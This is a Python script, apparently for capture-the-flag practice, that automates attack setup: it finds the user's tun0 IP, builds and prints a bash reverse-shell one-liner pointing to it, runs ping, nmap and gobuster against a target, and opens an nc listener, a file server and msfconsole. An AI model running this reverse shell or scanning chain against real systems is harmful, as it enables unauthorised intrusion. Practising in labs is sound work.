#!/usr/bin/python3
from os import system as cmd
from time  import sleep
import pyautogui as py
import subprocess
import re
import webbrowser


print('''
          __ __   ___         __   __  __ __   ___   __  _
         |  V  | | _ \        \ \_/ / |  V  | | __| |  \| |
         | \_/ | | v /  ____   > , <  | \_/ | | _|  | | ' |
         |_| |_| |_|_\ |____| /_/ \_\ |_| |_| |___| |_|\__|''')


cmd ('echo ""')
machine_ip = input("[*]Please ENTER Your TARGET  Machine IP:")
cmd ('echo ""')
print ("[1*]THIS IS YOUR MACHINE IP:",machine_ip)
#getting our tun0 ip
with open('ip.txt','w') as f:
        subprocess.run(['ip', 'a'],stdout=f,text=True) #--> storing ip.txt file in f  variable

#sperating TUN0 IP
txt_file = open('ip.txt','r') #--> input for ip.txt
IP = txt_file.read() #--> assign variable ip
pattern = re.compile("[10]+\.+[10]+\.+\d\d+\.+\w{2,3}") # find  ip using re.compile function and \d\d for two digit and \w{2,3} for last  tow or three digit
search_tun0 = pattern.findall(IP) #(searchin ip using pattern.findall functin
tun0_IP = search_tun0[0]
cmd ('echo ""')
print("[2*]TUN0 IP FOUND:",tun0_IP)

# creating  bash one liner for revershell
port = "8888"
bash_rev = "bash -c 'bash -i >& /dev/tcp/"+tun0_IP+"/"+port+" 0>&1\'"
cmd ('echo ""')
print ("[3*]Your bash revershell:",bash_rev)

#check host is live or not
cmd('echo ""')
cmd('ping -c 5 '+machine_ip+' >machine.txt')
ping = open('machine.txt','r')
machine_txt = ping.read()

if "100% packet loss" in machine_txt or "Host Unreachable" in machine_txt:
        print("[4*]YOUR machine IP IS NOT REACHABLE:",machine_ip)
        exit()
print("\n[4*]THE TARGET IP:",machine_ip,"IS LIVE")

#nmap scan
cmd ('echo ""')
cmd('nmap  '+machine_ip+' >nmap_initial')
cmd("cat nmap_initial | grep open | awk -F/ '{print $1}' ORS=',' | rev | cut -c 2- | rev > opened-ports.txt")
f = open('opened-ports.txt','r')
ports = f.read()
print ("[5*]Target machine open ports:",ports)

#opening web browser
#webbrowser.open_new("http://"+machine_ip)
#sleep(5)
#py.hotkey('ALT','TAB')
sleep(10)
py.hotkey('CTRL','SHIFT','R')
py.write("gobuster dir -u http://"+machine_ip+"/ -w /usr/share/wordlists/dirb/common.txt -o gobuster-common.txt")
py.hotkey("ENTER")
sleep(3)
py.hotkey('CTRL','SHIFT','T')
sleep(3)
py.write("python3 -m http.server")
py.hotkey("ENTER")
sleep(3)
py.hotkey("ALT", "RIGHT")
sleep(2)
py.write("nc -nlvp 1234")
py.hotkey("ENTER")
sleep(2)
py.hotkey("ALT","DOWN")
sleep(2)
py.write("msfconsole")
py.hotkey("ENTER")
